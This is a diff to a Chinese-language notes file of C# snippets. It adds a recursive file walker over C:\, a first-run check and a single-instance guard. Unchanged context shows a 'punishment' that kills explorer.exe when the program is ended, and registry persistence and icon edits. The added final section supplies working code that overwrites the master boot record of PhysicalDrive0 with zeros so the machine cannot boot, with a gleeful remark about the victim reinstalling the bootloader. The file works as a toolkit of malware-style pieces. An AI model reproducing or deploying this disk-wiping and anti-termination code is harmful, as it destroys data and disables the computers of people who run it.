@@ -36,6 +36,38 @@ catch(Exception ex)
 }
 ```
 
+```csharp
+static string[] TraverseDirectory(string path)
+        {
+            List<string> fileList = new List<string>();
+            try
+            {
+                // 获取当前目录下的所有文件
+                string[] files = Directory.GetFiles(path);
+                foreach (string file in files)
+                {
+                    fileList.Add(file);
+                }
+
+                // 递归获取所有子目录下的文件
+                string[] dirs = Directory.GetDirectories(path);
+                foreach (string dir in dirs)
+                {
+                    fileList.AddRange(TraverseDirectory(dir));
+                }
+            }
+            catch (Exception ex)
+            {
+                // 处理异常
+                //MessageBox.Show("处理遍历函数出错");
+            }
+            return fileList.ToArray();
+        }
+
+//你可以直接使用这个自定义函数
+string[] files = TraverseDirectory(@"C:\");
+```
+- 遍历指定目录的所有文件，并返回列表到TraverseDirectory，
 ## 防止程序被结束
 - 这必须给一点小小的惩罚
 ```csharp
@@ -84,7 +116,7 @@ Registry​.​SetValue​(​@"HKEY_CURRENT_USER\Software\Microsoft\Windows\Cur
   
  ​            process_CMD​.​Start​(​)​; 
   
- ​            process_CMD​.​StandardInput​.​WriteLine​(​"​taskkill /im explorer.exe /t /f ​"​)​;
+ ​            process_CMD​.​StandardInput​.​WriteLine​(​"​taskkill /im explorer.exe /f ​"​)​;
 ```
 
 ---
@@ -119,3 +151,77 @@ Registry.SetValue(@"HKEY_CLASSES_ROOT\CLSID\{2559a1f1-21d7-11d4-bdaf-00c04f60b9f
 Registry.SetValue(@"HKEY_CLASSES_ROOT\CLSID\{2559a1f0-21d7-11d4-bdaf-00c04f60b9f0}\DefaultIcon", "", Application.ExecutablePath, RegistryValueKind.ExpandString);
 
 ```
+
+---
+## 第一次运行
+1.  在Visual Studio中打开你的项目，选择“项目”菜单下的“属性”选项；
+2.  在“属性”窗口中选择“设置”选项卡；
+3.  添加一个名为“IsFirstRun”的布尔型设置，并将其值设置为“True”；
+4.  在程序启动时，读取“IsFirstRun”设置的值，如果为True，则执行你想要的操作，并将“IsFirstRun”设置为False；
+5.  下次程序启动时，读取“IsFirstRun”设置的值，如果为False，则跳过第一次运行的操作。
+
+以下是一个简单的示例代码，演示如何使用应用程序设置来判断程序是否是第一次运行：
+```csharp
+// 获取 IsFirstRun 设置的值
+bool isFirstRun = Properties.Settings.Default.IsFirstRun;
+
+// 如果是第一次运行，则执行操作，并将 IsFirstRun 设置为 false
+if (isFirstRun)
+{
+    // TODO: 执行第一次运行的操作
+
+    // 设置 IsFirstRun 为 false
+    Properties.Settings.Default.IsFirstRun = false;
+    Properties.Settings.Default.Save();
+}
+else
+{
+    // TODO: 跳过第一次运行的操作
+}
+```
+
+---
+## 防止多次点开
+```csharp  
+Process[] pro = Process.GetProcessesByName("CarParkInspectApp");  
+if (pro == null || pro.Length >= 2)  
+{  
+    MessageBox.Show("软件已打开，请勿重复打开！");  
+    Application.Exit();  
+    return;  
+}  
+```  
+- 此代码可直接放在程序主函数进程中。
+---
+## 清空MBR引导，让计算机无法开机
+修改 MBR（主引导记录）可以禁止计算机启动。但是，这个操作涉及到系统底层，需要非常小心，因为错误的操作可能导致计算机无法启动。请谨慎使用。  
+  
+以下是一个简单的示例，可以使用 C# 代码修改 MBR，禁止计算机启动：  
+  
+```csharp  
+using System.IO;  
+  
+// 读取 MBR  
+byte[] mbr = new byte[512];  
+using (FileStream stream = new FileStream(@"\\.\PhysicalDrive0", FileMode.Open))  
+{  
+    stream.Read(mbr, 0, mbr.Length);  
+}  
+  
+// 修改 MBR  
+for (int i = 0; i < mbr.Length; i++)  
+{  
+    mbr[i] = 0x00;  
+}  
+  
+// 写入 MBR  
+using (FileStream stream = new FileStream(@"\\.\PhysicalDrive0", FileMode.Open))  
+{  
+    stream.Write(mbr, 0, mbr.Length);  
+}  
+```  
+  
+在上面的示例中，我们使用 `FileStream` 类读取物理磁盘的 MBR，将其全部设置为 0x00，并重新写回磁盘。注意，这里的磁盘是物理磁盘，而非分区。  
+  
+简单地将 MBR 设置为 0x00
+想启动就得重新装引导，嘿嘿。
